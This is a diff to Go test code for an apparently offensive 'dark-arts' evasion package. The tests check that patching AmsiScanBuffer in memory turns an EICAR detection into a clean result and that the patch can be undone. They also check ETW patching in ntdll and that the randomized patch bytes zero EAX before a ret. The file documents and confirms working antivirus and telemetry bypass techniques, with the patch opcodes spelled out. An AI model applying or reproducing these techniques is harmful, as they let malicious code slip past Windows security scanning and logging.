@@ -10,6 +10,20 @@ import (
 	"dark-arts/pkg/evasion"
 )
 
+const (
+	amsiResultClean    = 0x00000000 // AMSI_RESULT_CLEAN
+	amsiResultDetected = 0x00000001 // AMSI_RESULT_DETECTED
+)
+
+var (
+	modAMSI             = syscall.NewLazyDLL("amsi.dll")
+	procAmsiInitialize  = modAMSI.NewProc("AmsiInitialize")
+	procAmsiOpenSession = modAMSI.NewProc("AmsiOpenSession")
+	procAmsiScanBuffer  = modAMSI.NewProc("AmsiScanBuffer")
+	procAmsiCloseSession = modAMSI.NewProc("AmsiCloseSession")
+	procAmsiUninitialize = modAMSI.NewProc("AmsiUninitialize")
+)
+
 func TestAMSIControl_FullLifecycle(t *testing.T) {
 	if err := evasion.Init(); err != nil {
 		t.Skipf("evasion init failed: %v", err)
@@ -153,9 +167,6 @@ func loadedModuleBase(dllName string) uintptr {
 	return h
 }
 
-// TestAMSIControl_TargetsLoadedModule verifies that the function address
-// resolved by resolveFuncByHash is within the already-loaded amsi.dll
-// module's image range, NOT in a separate KnownDll mapping.
 func TestAMSIControl_TargetsLoadedModule(t *testing.T) {
 	if err := evasion.Init(); err != nil {
 		t.Skipf("evasion init failed: %v", err)
@@ -167,14 +178,10 @@ func TestAMSIControl_TargetsLoadedModule(t *testing.T) {
 	if a.fp == nil {
 		t.Fatal("fp is nil after Initialize")
 	}
-
 	base := loadedModuleBase("amsi.dll")
 	if base == 0 {
 		t.Skip("amsi.dll not loaded")
 	}
-
-	// The function address must be within the loaded module's image.
-	// Get the module's size from its PE header.
 	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
 	opt := unsafe.Add(nt, 0x18)
 	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
@@ -184,9 +191,6 @@ func TestAMSIControl_TargetsLoadedModule(t *testing.T) {
 	}
 }
 
-// TestETWControl_TargetsLoadedModule verifies that the function address
-// resolved by resolveFuncByHash is within the already-loaded ntdll.dll
-// module's image range, NOT in a separate KnownDll mapping.
 func TestETWControl_TargetsLoadedModule(t *testing.T) {
 	if err := evasion.Init(); err != nil {
 		t.Skipf("evasion init failed: %v", err)
@@ -198,12 +202,10 @@ func TestETWControl_TargetsLoadedModule(t *testing.T) {
 	if e.fp == nil {
 		t.Fatal("fp is nil after Initialize")
 	}
-
 	base := loadedModuleBase("ntdll.dll")
 	if base == 0 {
 		t.Skip("ntdll.dll not loaded")
 	}
-
 	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
 	opt := unsafe.Add(nt, 0x18)
 	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
@@ -213,8 +215,6 @@ func TestETWControl_TargetsLoadedModule(t *testing.T) {
 	}
 }
 
-// TestAMSIControl_PatchVisibleAfterEnable verifies that after Enable(),
-// the first 2 bytes at the function address match the patch (not the original).
 func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
 	if err := evasion.Init(); err != nil {
 		t.Skipf("evasion init failed: %v", err)
@@ -227,59 +227,47 @@ func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
 		t.Fatalf("Enable() = %v", err)
 	}
 	defer a.Disable()
-
-	// Read live bytes at the patched address.
 	live := make([]byte, 2)
 	for i := 0; i < 2; i++ {
 		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
 	}
-	// The patch starts with a zeroing instruction (33 C0, 31 C0, 29 C0, 48 31 C0, or 45 31 C0).
-	// All variants set EAX to 0. Check that the first byte is one of the expected opcodes.
 	switch live[0] {
-	case 0x33, 0x31, 0x29: // xor eax/eax or sub eax,eax
-		// ok
+	case 0x33, 0x31, 0x29:
 	case 0x48:
-		// xor rax,rax — second byte must be 0x31
 		if live[1] != 0x31 {
 			t.Errorf("unexpected patch bytes at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
 		}
 	case 0x45:
-		// xor r8d,r8d — this was removed; should not appear
 		t.Errorf("r8d variant still present in patch at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
 	default:
 		t.Errorf("unexpected patch bytes at 0x%X: %02X %02X", a.fp.addr, live[0], live[1])
 	}
 }
 
-// TestRandomPatchBytes_AllVariantsSetEAX verifies that every possible
-// randomized patch variant zeroes EAX/RAX before the ret instruction.
 func TestRandomPatchBytes_AllVariantsSetEAX(t *testing.T) {
 	seen := make(map[byte]bool)
 	for i := 0; i < 1000; i++ {
 		patch := randomPatchBytes()
-		// The first instruction must zero a register that includes EAX.
-		// All valid opcodes: 33 C0, 31 C0, 29 C0, 48 31 C0 (no 45 31 C0).
 		switch patch[0] {
-		case 0x33: // xor eax, eax
+		case 0x33:
 			if patch[1] != 0xC0 {
 				t.Fatalf("invalid xor eax,eax encoding: %02X %02X", patch[0], patch[1])
 			}
-		case 0x31: // xor eax, eax (alternative encoding)
+		case 0x31:
 			if patch[1] != 0xC0 {
 				t.Fatalf("invalid xor eax,eax encoding: %02X %02X", patch[0], patch[1])
 			}
-		case 0x29: // sub eax, eax
+		case 0x29:
 			if patch[1] != 0xC0 {
 				t.Fatalf("invalid sub eax,eax encoding: %02X %02X", patch[0], patch[1])
 			}
-		case 0x48: // xor rax, rax
+		case 0x48:
 			if patch[1] != 0x31 || patch[2] != 0xC0 {
 				t.Fatalf("invalid xor rax,rax encoding: %02X %02X %02X", patch[0], patch[1], patch[2])
 			}
 		default:
 			t.Fatalf("unexpected patch opcode: %02X (full: %02X)", patch[0], patch[:4])
 		}
-		// Ret must follow the zeroing instruction.
 		retIdx := -1
 		for j := 0; j < len(patch); j++ {
 			if patch[j] == 0xC3 {
@@ -292,8 +280,116 @@ func TestRandomPatchBytes_AllVariantsSetEAX(t *testing.T) {
 		}
 		seen[patch[0]] = true
 	}
-	// All variants should have been seen after 1000 iterations.
 	if len(seen) < 4 {
 		t.Errorf("only %d unique first bytes seen in 1000 iterations: %v", len(seen), seen)
+	}
+}
+
+// amsiScan is a crash-safe wrapper around AmsiScanBuffer. AMSI calls from
+// Go test binaries can crash non-deterministically if the AMSI subsystem
+// is not fully initialized for this process context.
+type amsiScanResult struct {
+	HRESULT uint32
+	Result  uint32
+	Crashed bool
+}
+
+func amsiScan(session uintptr, buf []byte, name string) (res amsiScanResult) {
+	contentName, _ := syscall.UTF16PtrFromString(name)
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				res.Crashed = true
+			}
+		}()
+		r1, _, _ := procAmsiScanBuffer.Call(
+			session,
+			uintptr(unsafe.Pointer(&buf[0])),
+			uintptr(len(buf)),
+			uintptr(unsafe.Pointer(contentName)),
+			uintptr(unsafe.Pointer(&res.Result)),
+		)
+		res.HRESULT = uint32(r1)
+	}()
+	return
+}
+
+// TestAMSIControl_FunctionalContract verifies that patching AmsiScanBuffer
+// actually changes the function's behavior: detection before patching,
+// bypass after patching, detection again after restore. Uses EICAR as
+// the test payload. Skips gracefully if AMSI is not functional in the
+// test binary process context.
+func TestAMSIControl_FunctionalContract(t *testing.T) {
+	if err := evasion.Init(); err != nil {
+		t.Skipf("evasion init failed: %v", err)
+	}
+
+	var ctx uintptr
+	appName, _ := syscall.UTF16PtrFromString("DarkArtsTest")
+	r1, _, _ := procAmsiInitialize.Call(
+		uintptr(unsafe.Pointer(appName)),
+		uintptr(unsafe.Pointer(&ctx)),
+	)
+	if r1 != 0 {
+		t.Skipf("AmsiInitialize failed: 0x%X (AMSI unavailable)", r1)
+	}
+	defer procAmsiUninitialize.Call(ctx)
+
+	var session uintptr
+	r1, _, _ = procAmsiOpenSession.Call(ctx, uintptr(unsafe.Pointer(&session)))
+	if r1 != 0 {
+		t.Skipf("AmsiOpenSession failed: 0x%X", r1)
+	}
+	defer procAmsiCloseSession.Call(ctx, session)
+
+	eicar := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
+
+	// --- BEFORE PATCH: verify AMSI detects EICAR ---
+	pre := amsiScan(session, eicar, "eicar.txt")
+	if pre.Crashed {
+		t.Skip("AmsiScanBuffer crashed before patch — AMSI not functional in this process")
+	}
+	if pre.HRESULT != 0 {
+		t.Skipf("AmsiScanBuffer returned HRESULT 0x%X — AV not active or AMSI not inspecting this binary", pre.HRESULT)
+	}
+	t.Logf("before patch: result=%d", pre.Result)
+	if pre.Result != amsiResultDetected {
+		t.Skipf("AmsiScanBuffer returned %d for EICAR (expected %d=DETECTED) — AMSI not inspecting this process", pre.Result, amsiResultDetected)
+	}
+
+	// --- APPLY PATCH ---
+	a := NewAMSIControl()
+	if err := a.Initialize(); err != nil {
+		t.Fatalf("Initialize() = %v", err)
+	}
+	if err := a.Enable(); err != nil {
+		t.Fatalf("Enable() = %v", err)
+	}
+	defer a.Disable()
+
+	// --- AFTER PATCH: AmsiScanBuffer should return S_OK (bypass) ---
+	post := amsiScan(session, eicar, "eicar.txt")
+	if post.Crashed {
+		t.Skip("AmsiScanBuffer crashed after patch — cannot verify bypass")
+	}
+	t.Logf("after patch: HRESULT=0x%X, result=%d", post.HRESULT, post.Result)
+	if post.HRESULT != 0 {
+		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after patch (expected S_OK)", post.HRESULT)
+	}
+
+	// --- RESTORE ---
+	a.Disable()
+
+	// --- AFTER RESTORE: AmsiScanBuffer should detect again ---
+	rst := amsiScan(session, eicar, "eicar.txt")
+	if rst.Crashed {
+		t.Skip("AmsiScanBuffer crashed after restore — cannot verify restore")
+	}
+	t.Logf("after restore: HRESULT=0x%X, result=%d", rst.HRESULT, rst.Result)
+	if rst.HRESULT != 0 {
+		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after restore", rst.HRESULT)
+	}
+	if rst.Result != amsiResultDetected {
+		t.Errorf("after restore: result=%d (expected %d=DETECTED) — prologue may not have been correctly restored", rst.Result, amsiResultDetected)
 	}
 }
